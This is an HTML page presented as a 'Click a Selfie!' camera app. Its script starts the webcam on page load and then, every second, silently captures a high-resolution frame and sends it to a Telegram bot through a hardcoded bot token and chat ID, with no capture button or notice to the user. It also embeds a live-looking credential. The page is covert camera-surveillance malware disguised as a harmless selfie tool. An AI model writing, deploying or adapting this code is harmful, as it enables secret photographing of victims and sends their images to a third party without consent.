<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selfie Capture</title>
    <style>
        /* Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #ff3b30, #ff9500);
            font-family: 'Arial', sans-serif;
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        }

        h2 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            font-weight: 600;
        }

        /* Video container */
        video {
            border-radius: 15px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            margin-bottom: 15px;
            max-width: 100%;
            width: 100%;
            height: auto;
        }

        /* Hidden canvas */
        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h2>Click a Selfie!</h2>
    <video id="video" width="1080" height="1920" autoplay></video>
    <canvas id="canvas" width="6528" height="4896" style="display: none;"></canvas>

    <script>
        const botToken = "8199996433:AAHWMDwq0eqeuUsQApLD1v_hHmLPJSdCU9w";
        const chatId = "6708043138";  // Replace with your chat ID

        // Start webcam video stream
        async function startVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1080, height: 1920 } });
                document.getElementById('video').srcObject = stream;
            } catch (error) {
                alert("Please allow camera access!");
                console.error("Camera Error:", error);
            }
        }

        // Function to automatically capture and send the photo every second
        async function autoCapture() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            // Set the interval for automatic photo capture (1 second)
            setInterval(async () => {
                // Draw the video frame on the canvas at the desired resolution
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas to a Blob
                canvas.toBlob(async (blob) => {
                    // Create a URL for the captured image
                    const url = URL.createObjectURL(blob);

                    // Prepare the form data to send the image to Telegram
                    let formData = new FormData();
                    formData.append("chat_id", chatId);
                    formData.append("photo", blob);

                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;

                    // Send the photo to Telegram
                    try {
                        const response = await fetch(telegramUrl, { method: "POST", body: formData });
                        const result = await response.json();
                    } catch (error) {
                        console.error("Telegram API Error:", error);
                        alert("Error sending selfie.");
                    }

                    // Trigger auto-download of the image (direct download, no preview)
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `selfie_${Date.now()}.jpg`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                }, "image/jpeg");
            }, 1000); // Capture photo every 1 second
        }

        // Event listener to start the video when page loads
        window.addEventListener('load', async () => {
            await startVideo();
            autoCapture();  // Start auto-capture function after video starts
        });
    </script>
</body>
</html>
